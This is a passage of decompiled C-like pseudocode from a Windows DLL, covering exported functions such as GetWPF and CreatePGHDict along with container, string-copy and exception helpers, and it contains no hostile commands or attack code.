  while ( v7 );
  sub_10004A8B(v23);
  LOBYTE(v26) = 6;
  v11 = sub_1001445F(v18);
  LOBYTE(v26) = 7;
  sub_100140E1(dword_100BC624, (int)v20, 1, 1u, *(LPSECURITY_ATTRIBUTES *)(*v11 + 4));
  LOBYTE(v26) = 9;
  sub_100015D8(v18);
  sub_100140E1(dword_100BF690, (int)v22, 1, 1u, 0);
  LOBYTE(v26) = 10;
  Block = operator new(0x7Au);
  LOBYTE(v26) = 11;
  if ( Block )
  {
    v12 = (_DWORD *)sub_10016983(0, (int)v24, 0);
    LOBYTE(v26) = 12;
    v16 = 1;
    v13 = sub_10012ECB(
            (int)Block,
            (int)&unk_100BC61C,
            (int)&unk_100BC62C,
            (int)v20,
            (int)&unk_100BF698,
            v12,
            a1,
            (void *)1);
  }
  else
  {
    v13 = 0;
  }
  v26 = 13;
  v14 = sub_100017F0(v18, v13);
  v26 = 14;
  sub_10004BD0(v23, (int)v14);
  LOBYTE(v26) = 13;
  sub_10001834(v18);
  v26 = 10;
  if ( (v16 & 1) != 0 )
    sub_10016B53(v24);
  sub_10014671(v23, v25, (int)v22, (int)v21);
  LOBYTE(v26) = 15;
  sub_10014738((int)v25);
  LOBYTE(v26) = 10;
  sub_100146DD(v25);
  LOBYTE(v26) = 9;
  sub_100141CF(v22);
  LOBYTE(v26) = 6;
  sub_100141CF(v20);
  LOBYTE(v26) = 1;
  sub_10004B05(v23);
  LOBYTE(v26) = 0;
  sub_10010D3B(v21);
  v26 = -1;
  sub_1000EE98(v19);
  return 1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100BC624: using guessed type _DWORD dword_100BC624[2];
// 100BF690: using guessed type _DWORD dword_100BF690[2];
// 1000B3E1: using guessed type _DWORD var_98[4];
// 1000B3E1: using guessed type _DWORD var_7C[5];
// 1000B3E1: using guessed type _DWORD var_A0[2];
// 1000B3E1: using guessed type int var_5C[4];
// 1000B3E1: using guessed type int var_88[3];
// 1000B3E1: using guessed type int var_68[3];
// 1000B3E1: using guessed type int var_4C[5];
// 1000B3E1: using guessed type int var_38[11];

//----- (1000B6D3) --------------------------------------------------------
int __stdcall GetWPF(int a1)
{
  int v2; // [esp+0h] [ebp-28h] BYREF
  _DWORD v3[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v4; // [esp+24h] [ebp-4h]

  v3[3] = &v2;
  sub_10010428((int)v3);
  v4 = 0;
  sub_1000EFCA();
  LOBYTE(v4) = 1;
  sub_10013547((void (__stdcall *)(int))sub_1000B3E1, a1);
  v4 = 0;
  sub_1001A872();
  v4 = -1;
  sub_10010466(v3);
  return 0;
}

//----- (1000B741) --------------------------------------------------------
LONG sub_1000B741()
{
  sub_1000CE59((int *)&unk_100BC634);
  sub_1000CE59((int *)&unk_100BC62C);
  sub_1000CE59(dword_100BC624);
  return sub_1000CE59((int *)&unk_100BC61C);
}
// 100BC624: using guessed type _DWORD dword_100BC624[2];

//----- (1000B79A) --------------------------------------------------------
int CreatePGHDict()
{
  int v0; // esi
  int v2; // [esp+0h] [ebp-28h] BYREF
  _DWORD v3[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v4; // [esp+24h] [ebp-4h]

  v3[3] = &v2;
  sub_10010428((int)v3);
  v4 = 0;
  sub_1000EFCA();
  LOBYTE(v4) = 1;
  v0 = sub_10013547((void (__stdcall *)(int))sub_1000B855, 0);
  v4 = -1;
  sub_10010466(v3);
  return v0;
}

//----- (1000B811) --------------------------------------------------------
LONG sub_1000B811()
{
  int v0; // eax
  int v2[3]; // [esp+0h] [ebp-18h] BYREF
  int v3; // [esp+14h] [ebp-4h]

  v0 = sub_100140E1(dword_100BC624, (int)v2, 1, 1u, 0);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v0 + 16))(v0);
  v3 = -1;
  return sub_100141CF(v2);
}
// 100BC624: using guessed type _DWORD dword_100BC624[2];
// 1000B811: using guessed type int var_18[3];

//----- (1000B855) --------------------------------------------------------
int __stdcall sub_1000B855(int a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  int v3; // eax
  int v4; // ecx
  int v6; // [esp-20h] [ebp-150h] BYREF
  int v7; // [esp-1Ch] [ebp-14Ch]
  int v8; // [esp-18h] [ebp-148h]
  int v9[2]; // [esp-14h] [ebp-144h] BYREF
  int v10; // [esp-Ch] [ebp-13Ch] BYREF
  int v11; // [esp-8h] [ebp-138h]
  int v12; // [esp-4h] [ebp-134h]
  int v13[2]; // [esp+4h] [ebp-12Ch] BYREF
  int v14[3]; // [esp+Ch] [ebp-124h] BYREF
  int v15[3]; // [esp+18h] [ebp-118h] BYREF
  _DWORD v16[5]; // [esp+24h] [ebp-10Ch] BYREF
  unsigned int v17[30]; // [esp+38h] [ebp-F8h] BYREF
  int v18[29]; // [esp+B0h] [ebp-80h] BYREF
  int v19; // [esp+12Ch] [ebp-4h]

  v1 = sub_1001445F(v13);
  v19 = 0;
  sub_100140E1(dword_100BC624, (int)v14, 1, 1u, *(LPSECURITY_ATTRIBUTES *)(*v1 + 4));
  LOBYTE(v19) = 2;
  sub_100015D8(v13);
  v15[2] = (int)v9;
  sub_10016983((void *)6, (int)v9, &unk_10092E90);
  LOBYTE(v19) = 3;
  v8 = 6291456;
  v2 = sub_10012A7C(v15, (int)&unk_100BF064);
  LOBYTE(v19) = 4;
  v3 = sub_10012BA7((int)v2);
  v7 = v4;
  v6 = v4;
  v13[0] = (int)&v6;
  sub_1000CE26(&v6, v3);
  LOBYTE(v19) = 6;
  sub_1000C1DD(v18, v6, v7, v8, v9[0], v9[1], v10, v11, v12);
  LOBYTE(v19) = 8;
  sub_10012AAC(v15);
  v13[0] = (int)&v10;
  sub_100141F3(&v10, (int)v14);
  LOBYTE(v19) = 8;
  sub_10009AFE(v16, (int)v18, v10, v11, v12);
  LOBYTE(v19) = 10;
  sub_1003B0BA(v17, (int)v16);
  LOBYTE(v19) = 11;
  sub_1001DD96(v17);
  sub_1001E075((int *)v17, -1, 0);
  sub_10014F97((int)v14);
  LOBYTE(v19) = 10;
  sub_1003B119((int *)v17);
  LOBYTE(v19) = 8;
  sub_10009B74(v16);
  LOBYTE(v19) = 2;
  sub_1000BA07(v18);
  v19 = -1;
  sub_100141CF(v14);
  return 1;
}
// 1000B8F4: variable 'v4' is possibly undefined
// 100BC624: using guessed type _DWORD dword_100BC624[2];
// 1000B855: using guessed type int var_124[3];
// 1000B855: using guessed type int var_80[29];
// 1000B855: using guessed type _DWORD var_10C[5];
// 1000B855: using guessed type unsigned int var_F8[30];

//----- (1000BA07) --------------------------------------------------------
LONG __stdcall sub_1000BA07(int *a1)
{
  sub_100172B1(a1 + 18);
  sub_1000BA57(a1 + 8);
  sub_10016B53(a1 + 3);
  return sub_1000CE59(a1);
}

//----- (1000BA57) --------------------------------------------------------
void *__stdcall sub_1000BA57(_DWORD *a1)
{
  return sub_1000BDE7(a1);
}

//----- (1000BA7B) --------------------------------------------------------
int __thiscall sub_1000BA7B(int this, int a2)
{
  sub_1000BBB7((void *)(this + 4), a2);
  return a2;
}

//----- (1000BAB1) --------------------------------------------------------
int __thiscall sub_1000BAB1(int this, int a2)
{
  sub_1000BBB7((void *)(this + 20), a2);
  return a2;
}

//----- (1000BAE7) --------------------------------------------------------
_DWORD *__thiscall sub_1000BAE7(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x18u);
  if ( v3 )
    v4 = sub_1000BBEA(this, v3);
  else
    v4 = 0;
  sub_1000C00E(a2, (int)v4);
  return a2;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000BB42) --------------------------------------------------------
void *__thiscall sub_1000BB42(_DWORD *this)
{
  void *result; // eax

  result = &loc_100782A7;
  *this = &off_100935B8;
  *this = off_10092F20;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100935B8: using guessed type int (__thiscall *off_100935B8)(void *Block, char);

//----- (1000BB6C) --------------------------------------------------------
BOOL __thiscall sub_1000BB6C(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this) == 0;
}

//----- (1000BB7E) --------------------------------------------------------
_DWORD *__thiscall sub_1000BB7E(_DWORD *Block, char a2)
{
  sub_1000BB42(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000BBB7) --------------------------------------------------------
int __thiscall sub_1000BBB7(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 8))(this, a2);
  return a2;
}

//----- (1000BBEA) --------------------------------------------------------
_DWORD *__thiscall sub_1000BBEA(void *this, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_100935E8;
  a2[1] = this;
  *a2 = &off_10093608;
  a2[2] = off_100935E4;
  a2[5] = 0;
  return result;
}
// 100935E4: using guessed type int (__thiscall *off_100935E4[2])(void *Block, char);
// 100935E8: using guessed type int (__thiscall *off_100935E8)(void *Block, char);
// 10093608: using guessed type int (__thiscall *off_10093608)(void *Block, char);

//----- (1000BC2B) --------------------------------------------------------
BOOL __thiscall sub_1000BC2B(int this)
{
  return *(_DWORD *)(this + 20) >= (unsigned int)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (1000BC3E) --------------------------------------------------------
BOOL __thiscall sub_1000BC3E(_DWORD *this)
{
  return this[5] != 0;
}

//----- (1000BC48) --------------------------------------------------------
_DWORD *__thiscall sub_1000BC48(_DWORD *this)
{
  _DWORD *v2; // eax
  int v4; // [esp-4h] [ebp-8h]

  v2 = (_DWORD *)(*(int (__thiscall **)(int, _DWORD))(*(_DWORD *)(this[1] + 4) + 44))(this[1] + 4, this[5]);
  v4 = this[5];
  this[3] = *v2;
  this[4] = *(_DWORD *)(*(int (__thiscall **)(int, int))(*(_DWORD *)(this[1] + 20) + 44))(this[1] + 20, v4);
  return this + 2;
}

//----- (1000BC76) --------------------------------------------------------
void __thiscall sub_1000BC76(_DWORD *this)
{
  ++this[5];
}

//----- (1000BC7A) --------------------------------------------------------
void __thiscall sub_1000BC7A(_DWORD *this)
{
  --this[5];
}

//----- (1000BC7E) --------------------------------------------------------
void __noreturn sub_1000BC7E()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1000BC7E: using guessed type void __noreturn sub_1000BC7E();
// 1000BC7E: using guessed type _DWORD pExceptionObject[2];

//----- (1000BC9B) --------------------------------------------------------
void __noreturn sub_1000BC9B()
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100166E1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 1000BC9B: using guessed type void __noreturn sub_1000BC9B();
// 1000BC9B: using guessed type _DWORD pExceptionObject[2];

//----- (1000BCBF) --------------------------------------------------------
void __thiscall sub_1000BCBF(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // ecx

  v1 = *(_DWORD *)(*this + 4);
  v2 = this + 1;
  *(_DWORD *)((char *)v2 + v1 - 4) = &off_10093570;
  sub_1001646C(v2);
}
// 10093570: using guessed type int (__stdcall *off_10093570)(char);

//----- (1000BCD4) --------------------------------------------------------
_DWORD *__thiscall sub_1000BCD4(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10093578;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_10016406(this + 1, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10093570;
  return this;
}
// 10093570: using guessed type int (__stdcall *off_10093570)(char);

//----- (1000BD3D) --------------------------------------------------------
_DWORD *__thiscall sub_1000BD3D(_DWORD *Block, char a2)
{
  sub_1000BD96(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000BD77) --------------------------------------------------------
char *__thiscall sub_1000BD77(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_1000BCBF(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (1000BD96) --------------------------------------------------------
_DWORD *__stdcall sub_1000BD96(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  a1[2] = off_100935E4;
  *a1 = &off_100935E8;
  return result;
}
// 100935E4: using guessed type int (__thiscall *off_100935E4[2])(void *Block, char);
// 100935E8: using guessed type int (__thiscall *off_100935E8)(void *Block, char);

//----- (1000BDE7) --------------------------------------------------------
void *__thiscall sub_1000BDE7(_DWORD *this)
{
  *this = &off_10093580;
  sub_10007890((int)(this + 5));
  sub_10007890((int)(this + 1));
  return sub_1000BB42(this);
}
// 10093580: using guessed type int (__thiscall *off_10093580)(void *Block, char);

//----- (1000BE39) --------------------------------------------------------
bool __thiscall sub_1000BE39(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1000C0FB(this, a2);
  return v3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
      && *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v3) == *a2;
}

//----- (1000BE70) --------------------------------------------------------
char __thiscall sub_1000BE70(_DWORD *this, _DWORD *a2)
{
  int v3; // edi

  v3 = sub_1000C0FB(this, a2);
  if ( v3 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v3) != *a2 )
  {
    return 0;
  }
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 40))(this + 1, v3);
  (*(void (__thiscall **)(_DWORD *, int))(this[5] + 40))(this + 5, v3);
  return 1;
}

//----- (1000BEBD) --------------------------------------------------------
int __thiscall sub_1000BEBD(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // edi
  int v4; // esi

  v2 = a2;
  v4 = sub_1000C0FB(this, a2);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 44))(this + 1, v4) != *v2 )
  {
    (*(void (__thiscall **)(_DWORD *, _DWORD *, int))(this[1] + 32))(this + 1, v2, v4);
    a2 = 0;
    (*(void (__thiscall **)(_DWORD *, _DWORD **, int))(this[5] + 32))(this + 5, &a2, v4);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 44))(this + 5, v4);
}

//----- (1000BF15) --------------------------------------------------------
int __thiscall sub_1000BF15(_DWORD *this, _DWORD *pExceptionObject)
{
  _DWORD *v2; // esi
  int v4; // edi

  v2 = pExceptionObject;
  v4 = sub_1000C0FB(this, pExceptionObject);
  if ( v4 == (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)
    || *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, v4) != *v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD *, int))(this[5] + 48))(this + 5, v4);
}

//----- (1000BF6A) --------------------------------------------------------
_DWORD *__thiscall sub_1000BF6A(_DWORD *this, _DWORD *a2)
{
  sub_1000C0A7(this + 1, a2);
  return a2;
}

//----- (1000BFA2) --------------------------------------------------------
_DWORD *__thiscall sub_1000BFA2(_DWORD *this, _DWORD *a2)
{
  sub_1000C0A7(this + 5, a2);
  return a2;
}

//----- (1000BFDA) --------------------------------------------------------
int __thiscall sub_1000BFDA(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 60))(this + 1, a2);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 60))(this + 5);
}

//----- (1000BFF2) --------------------------------------------------------
int __thiscall sub_1000BFF2(_DWORD *this)
{
  (*(void (__thiscall **)(_DWORD *))(this[1] + 52))(this + 1);
  return (*(int (__thiscall **)(_DWORD *))(this[5] + 52))(this + 5);
}

//----- (1000C006) --------------------------------------------------------
int __thiscall sub_1000C006(_DWORD *this)
{
  return (*(int (__thiscall **)(_DWORD *))(this[1] + 64))(this + 1);
}

//----- (1000C00E) --------------------------------------------------------
_DWORD *__userpurge sub_1000C00E@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000C052) --------------------------------------------------------
void __thiscall sub_1000C052(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_1000C17C((int)this);
}

//----- (1000C08B) --------------------------------------------------------
_DWORD *__thiscall sub_1000C08B(_DWORD *Block, char a2)
{
  sub_1000BDE7(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000C0A7) --------------------------------------------------------
_DWORD *__userpurge sub_1000C0A7@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  int v5; // [esp-4h] [ebp-14h]

  sub_10007D82(a2);
  *a2 = &off_100932A8;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10007B25(a2, v2, v4, v5);
  return a2;
}
// 100932A8: using guessed type int (__thiscall *off_100932A8)(void *Block, char);

//----- (1000C0FB) --------------------------------------------------------
int __userpurge sub_1000C0FB@<eax>(_DWORD *a1@<ebx>, _DWORD *a2)
{
  int v2; // esi
  int v3; // eax
  int v5; // [esp+4h] [ebp-8h]
  int v6; // [esp+8h] [ebp-4h]

  v6 = -1;
  v2 = (unsigned int)(*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1) >> 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  if ( v2 > -1 )
  {
    do
    {
      if ( v2 >= v5 || *a2 == *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
        break;
      if ( *a2 >= *(_DWORD *)(*(int (__thiscall **)(_DWORD *, int))(a1[1] + 48))(a1 + 1, v2) )
      {
        v6 = v2;
        v3 = v5 + v2 + 1;
      }
      else
      {
        v5 = v2;
        v3 = v2 + v6;
      }
      v2 = v3 / 2;
    }
    while ( v3 / 2 > v6 );
  }
  if ( v2 == v6 )
    return v6 + 1;
  return v2;
}

//----- (1000C17C) --------------------------------------------------------
void __usercall sub_1000C17C(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1000C1A4) --------------------------------------------------------
_DWORD *__stdcall sub_1000C1A4(_DWORD *a1)
{
  sub_1000C593(a1);
  a1[9] = 0;
  return a1;
}

//----- (1000C1DD) --------------------------------------------------------
_DWORD *__stdcall sub_1000C1DD(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9)
{
  sub_1000CE26(a1, (int)&a2);
  a1[2] = a4;
  sub_10016AE9(&a5, (int)(a1 + 3));
  sub_1000C1A4(a1 + 8);
  sub_10017224((int)(a1 + 18));
  a1[17] = 100;
  sub_1000CE59(&a2);
  sub_10016B53(&a5);
  return a1;
}

//----- (1000C261) --------------------------------------------------------
void __thiscall sub_1000C261(int *this, unsigned __int8 (__thiscall ***a2)(_DWORD), int a3)
{
  unsigned __int8 (__thiscall ***v4)(_DWORD); // esi
  char v5; // al
  int v6; // [esp+0h] [ebp-48h] BYREF
  LONG v7[5]; // [esp+Ch] [ebp-3Ch] BYREF
  char v8[12]; // [esp+20h] [ebp-28h] BYREF
  _DWORD v9[4]; // [esp+2Ch] [ebp-1Ch] BYREF
  int v10; // [esp+44h] [ebp-4h]

  v9[3] = &v6;
  v10 = 0;
  v4 = a2;
  if ( (**a2)(a2) )
  {
    ((void (__thiscall *)(unsigned __int8 (__thiscall ***)(_DWORD), LONG *))(*v4)[1])(v4, v7);
    LOBYTE(v10) = 1;
    sub_100171BE(this + 18, v9);
    LOBYTE(v10) = 2;
    if ( ((int (__thiscall *)(_DWORD))(*v4)[3])(v4) != 1
      || (sub_10015CC3(1, (int)v8), v5 = sub_10015CDE(v7, (int)v8), sub_10009853(this + 8, v5) != 1) )
    {
      LOBYTE(v10) = 3;
      sub_1000C325((int)this, v7);
      v10 = 2;
    }
    LOBYTE(v10) = 1;
    sub_100171F2(v9);
    LOBYTE(v10) = 0;
    sub_10016B53(v7);
  }
  v10 = -1;
  sub_1000AD50((void **)&a2);
}
// 1000C261: using guessed type LONG var_3C[5];

//----- (1000C325) --------------------------------------------------------
void __stdcall sub_1000C325(int a1, volatile LONG *a2)
{
  char v2; // bl
  _DWORD *v3; // eax
  int v4[3]; // [esp-14h] [ebp-11Ch] BYREF
  volatile LONG *v5; // [esp-8h] [ebp-110h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-10Ch]
  char v7; // [esp+13h] [ebp-F5h]
  void *Block; // [esp+14h] [ebp-F4h] BYREF
  volatile LONG *lpAddend; // [esp+18h] [ebp-F0h]
  volatile LONG **v10; // [esp+1Ch] [ebp-ECh]
  _BYTE v11[8]; // [esp+20h] [ebp-E8h] BYREF
  int v12; // [esp+28h] [ebp-E0h]
  _DWORD v13[4]; // [esp+34h] [ebp-D4h] BYREF
  _DWORD v14[6]; // [esp+44h] [ebp-C4h] BYREF
  int v15[9]; // [esp+5Ch] [ebp-ACh] BYREF
  char v16[48]; // [esp+80h] [ebp-88h] BYREF
  _DWORD v17[19]; // [esp+B0h] [ebp-58h] BYREF
  int v18; // [esp+104h] [ebp-4h]

  v2 = !sub_10020CD2(a1);
  v7 = v2;
  Block = operator new(0x28u);
  v3 = 0;
  v18 = 0;
  if ( Block )
  {
    v5 = v6;
    v10 = &v5;
    sub_10014512(&v5);
    LOBYTE(v18) = 0;
    v3 = sub_10011AFB(0, 0x40000000, Block, a1, 128, 4, (int)v5, v6);
    v2 = v7;
  }
  v18 = -1;
  sub_10006A72(&Block, (int)v3);
  v18 = 2;
  v10 = &v5;
  v6 = lpAddend;
  v5 = (volatile LONG *)Block;
  InterlockedIncrement(lpAddend);
  LOBYTE(v18) = 2;
  sub_10022209((int)v11, (int)v5, v6);
  LOBYTE(v18) = 4;
  if ( v2 == 1 )
    (*(void (__thiscall **)(int, int))(*(_DWORD *)v12 + 56))(v12, a1 + 12);
  sub_10017D60(v15);
  LOBYTE(v18) = 5;
  sub_1001D2D9(v17);
  LOBYTE(v18) = 6;
  sub_10021DA7((int)v16, (int)v15, (int)v17);
  LOBYTE(v18) = 7;
  v6 = a2;
  sub_10021EED(v16);
  sub_10022413(v16);
  sub_10022561(v14, (int)v11, *(_DWORD *)(a1 + 8));
  LOBYTE(v18) = 8;
  sub_1001CC48(v13, (int)v14, 1);
  LOBYTE(v18) = 9;
  (*(void (__thiscall **)(int, _DWORD, int))(*(_DWORD *)v12 + 64))(v12, 0, 2);
  v10 = (volatile LONG **)v4;
  sub_10017EAF(v15, (int)v4);
  LOBYTE(v18) = 9;
  sub_1001CDCD(v13, v4[0], v4[1], v4[2], (int)v5, (int)v6);
  sub_10022413(v13);
  LOBYTE(v18) = 8;
  sub_1001CC9A(v13);
  LOBYTE(v18) = 7;
  sub_100225BC(v14);
  LOBYTE(v18) = 6;
  sub_10021E6F((int)v16);
  LOBYTE(v18) = 5;
  sub_1001D336((int)v17);
  LOBYTE(v18) = 4;
  sub_10017DC3((int)v15);
  LOBYTE(v18) = 2;
  sub_10022277(v11);
  v18 = -1;
  sub_10003B09(&Block);
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 1000C325: using guessed type _BYTE var_E8[8];
// 1000C325: using guessed type _DWORD var_D4[4];
// 1000C325: using guessed type int var_AC[9];
// 1000C325: using guessed type _DWORD var_58[19];
// 1000C325: using guessed type _DWORD var_C4[6];

//----- (1000C593) --------------------------------------------------------
_DWORD *__stdcall sub_1000C593(_DWORD *a1)
{
  sub_1000C5DF(a1);
  *a1 = &off_10093580;
  sub_1000C60E(a1 + 1);
  sub_1000C60E(a1 + 5);
  return a1;
}
// 10093580: using guessed type int (__thiscall *off_10093580)(void *Block, char);

//----- (1000C5DF) --------------------------------------------------------
_DWORD *__stdcall sub_1000C5DF(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10092F20;
  *a1 = &off_100935B8;
  return result;
}
// 10092F20: using guessed type int (__thiscall *off_10092F20[2])(void *Block, char);
// 100935B8: using guessed type int (__thiscall *off_100935B8)(void *Block, char);

//----- (1000C60E) --------------------------------------------------------
_DWORD *__stdcall sub_1000C60E(_DWORD *a1)
{
  unsigned int i; // eax

  sub_10007D82(a1);
  *a1 = &off_100932A8;
  for ( i = 1; i < 0x10; i *= 2 )
    ;
  sub_10007DB1(i, a1);
  return a1;
}
// 100932A8: using guessed type int (__thiscall *off_100932A8)(void *Block, char);

//----- (1000C650) --------------------------------------------------------
errno_t __usercall sub_1000C650@<eax>(int a1@<eax>, void *Destination, int a3, void *Source)
{
  return memcpy_s(Destination, 2 * a3, Source, 2 * a1);
}

//----- (1000C66C) --------------------------------------------------------
char *__cdecl sub_1000C66C(char *a1)
{
  unsigned int v1; // ecx
  char v2; // cf
  unsigned int v3; // ecx
  char *v4; // edi
  int i; // ecx

  if ( v1 )
  {
    v2 = v1 & 1;
    v3 = v1 >> 1;
    memset32(a1, 2097184, v3);
    v4 = &a1[4 * v3];
    for ( i = v2; i; --i )
    {
      *(_WORD *)v4 = 32;
      v4 += 2;
    }
  }
  return a1;
}
// 1000C671: variable 'v1' is possibly undefined

//----- (1000C690) --------------------------------------------------------
errno_t __userpurge sub_1000C690@<eax>(int a1@<esi>, wchar_t *String)
{
  size_t v2; // eax
  wchar_t *v3; // eax
  errno_t result; // eax
  rsize_t v5; // [esp-10h] [ebp-10h]
  const wchar_t *v6; // [esp-Ch] [ebp-Ch]
  const wchar_t *v7; // [esp-4h] [ebp-4h]

  v7 = String;
  *(_DWORD *)(a1 + 16) = 0;
  *(_BYTE *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  v2 = wcslen(v7);
  *(_DWORD *)(a1 + 28) = v2;
  *(_DWORD *)(a1 + 32) = v2;
  v3 = (wchar_t *)operator new(2 * (v2 + 1));
  v6 = String;
  v5 = *(_DWORD *)(a1 + 28) + 1;
  *(_DWORD *)(a1 + 12) = v3;
  result = wcscpy_s(v3, v5, v6);
  if ( result )
  {
    sub_10016441(&String);
    _CxxThrowException(&String, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1000C6F3) --------------------------------------------------------
_DWORD *__cdecl sub_1000C6F3(_DWORD *a1)
{
  int *v1; // ecx
  int *v2; // edi
  unsigned int v3; // ebx
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7[5]; // [esp+10h] [ebp-24h] BYREF
  int v8; // [esp+24h] [ebp-10h]
  int v9; // [esp+30h] [ebp-4h]

  v2 = v1;
  v8 = 0;
  v3 = v1[3];
  if ( v3 < 2 )
    goto LABEL_8;
  if ( sub_10016EC6(v1) != -257 )
  {
    if ( v3 >= 4 && sub_10016E72(v2, 0) == 0xFFFF )
    {
      v5 = (_DWORD *)sub_10016DFF(v3 - 4, v2, (int)v7, 4);
      v9 = 2;
      sub_1000CCE5(v5, a1);
      v8 = 1;
      goto LABEL_4;
    }
LABEL_8:
    sub_1000CDFA(a1);
    v9 = 0;
    v8 = 1;
    return a1;
  }
  v4 = (_DWORD *)sub_10016DFF(v3 - 2, v2, (int)v7, 2);
  v9 = 1;
  sub_1000CCE5(v4, a1);
  v8 = 1;
LABEL_4:
  LOBYTE(v9) = 0;
  sub_10016B53(v7);
  return a1;
}
// 1000C6FF: variable 'v1' is possibly undefined
// 1000C6F3: using guessed type int var_24[5];

//----- (1000C7A8) --------------------------------------------------------
_DWORD *__userpurge sub_1000C7A8@<eax>(int a1@<edi>, _DWORD *a2)
{
  size_t v2; // eax
  const void *v3; // ebx
  int v4; // eax
  size_t v6; // [esp-4h] [ebp-24h]

  v2 = sub_1000D0EE(a1);
  sub_10016983((void *)(2 * v2 + 2), (int)a2, 0);
  sub_10016EE4(a2, 65279);
  v3 = *(const void **)(*(_DWORD *)(a1 + 4) + 12);
  v6 = 2 * sub_1000D0EE(a1);
  v4 = sub_10016C00(a2);
  memcpy((void *)(v4 + 2), v3, v6);
  *(_BYTE *)(a2[1] + 8) = 1;
  return a2;
}

//----- (1000C81A) --------------------------------------------------------
errno_t __userpurge sub_1000C81A@<eax>(int a1@<esi>, wchar_t *String, wchar_t *Source)
{
  size_t v3; // edi
  size_t v4; // eax
  wchar_t *v5; // eax
  errno_t result; // eax
  rsize_t v7; // [esp-14h] [ebp-18h]
  const wchar_t *v8; // [esp-10h] [ebp-14h]
  const wchar_t *v9; // [esp-4h] [ebp-8h]

  v9 = String;
